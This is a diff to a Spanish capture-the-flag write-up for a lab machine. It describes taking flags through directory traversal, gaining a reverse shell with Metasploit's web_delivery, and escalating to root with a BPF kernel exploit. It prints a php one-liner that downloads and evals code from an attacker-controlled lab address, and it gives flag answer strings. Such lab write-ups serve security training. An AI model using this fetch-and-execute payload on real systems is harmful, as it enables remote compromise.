@@ -318,6 +318,83 @@ Una vez dentro se puede extraer los archivos de ftp usando el comando **mget**
 
 Septima Flag **FLAG{FTP_4n0nym0us_G00D_JoB!}**
 
+Adicionalmente dos flags pueden obtenerse mediante directory traversal aprovechando la vulnerabilidad de remote code execution usada anteriormente.
+
+**Flag en directorio /opt**
+
+![](/images/modulo2/flag_opt.png)
+
+**Octava Flag**
+
+![](/images/modulo2/flag8.png)
+
+La novena flag puede obtenerse con el mismo metodo en el directorio /home/deloitte 
+
+**Flag en directorio /home/deloitte**
+
+![](/images/modulo2/flag_deloitte.png)
+
+**Novena Flag**
+
+![[(/images/modulo2/flag9.png)
+
+En esta flag se da una pista donde probablemente la ultima flag se encuentre en el directorio /root. 
+
+## Explotacion
+
+La ultima flag menciona que es el momento de convertirnos en **root** para esto en primer lugar se debe explotar la maquina para posteriormente escalar privilegios. Como vectores de entrada estan exploits conocidos para el apache James, realizar una shell reversa con netcat aprovechando la vulnerabilidad RCE sin exito alguno. Un vector de entrada que se pudo ejecutar satisfactoriamente fue usando **Web delivery**. Web delivery es un script de metasploit que se puede utilizar cuando se tiene acceso parcial a la maquina mediante un RCE pero no se puede generar una shell de la manera tradicional.
+
+**Parametros de Web_delivery**
+
+![](/images/modulo2/web_delivery1.png)
+
+Como resultado se genera un payload que al copiarlo en el RCE creara la shell reversa
+
+`php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.190.128:8080/3DirDKfcn0hc5b', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"`
+
+**Sesion activa**
+
+![](/images/modulo2/session1.png)
+
+Enumerando con uname -a se muestra que la version actual del kernel corresponde a 4.4.
+
+```
+uname -a
+Linux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+## Post Explotacion y escalada de privilegios
+
+Luego de hacer una busqueda de exploits vulnerables para ubuntu 16.04 kernel 4.4 se muestran las siguientes opciones.
+
+**Lista de exploits posibles para Ubuntu 16.04**
+
+![](/images/modulo2/searchsploit.png)
+
+Entre los resultados obtenidos se muestra un exploit disponible para metasploit correspondiente a **BPF Local Privilege Escalation**, asi que aprovechando que ya se tiene una sesion de meterpreter activa se usara ese exploit.
+
+** Nueva sesion activa**
+
+![](/images/modulo2/postexploit.png)
+
+**Nota:** Este exploit utilizaba tambien por defecto el puerto 4444 y por esta razon dio problemas al momento de ejecutarlo, para que funcione adecuadamente se debe cambiar por un puerto cualquiera en este caso fue 4446.
+
+**Decima Flag**
+
+![](/images/modulo2/flag10.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ## Bibliografía
